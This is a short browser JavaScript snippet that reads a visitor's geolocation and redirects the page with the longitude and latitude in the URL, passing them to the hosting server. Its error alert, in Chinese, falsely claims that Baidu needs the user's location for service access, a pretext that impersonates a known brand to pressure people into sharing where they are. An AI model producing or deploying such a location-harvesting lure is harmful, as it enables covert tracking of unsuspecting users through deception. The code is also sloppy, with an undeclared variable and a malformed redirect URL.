<script>
    function get_location(){
        if(navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    let getLongitude = position.coords.longitude;
                    let getLatitude = position.coords.latitude;
                    console.log(getLongitude) ;
                    console.log(getLatitude) ;
                    list_location = [
                        'Longitude:' + getLongitude ,
                        'Latitude:' + getLatitude ,
                    ] ;
                    window.location.href = "locationInfo="+list_location ;
                },
                //on error
                function(error) {
                    var errorType = ['百度需要您的位置信息才可以进行服务访问', '位置信息不可用', '获取信息超时'];
                    alert(errorType[error.code - 1]);
                }
            );
        } ;
    }
</script>
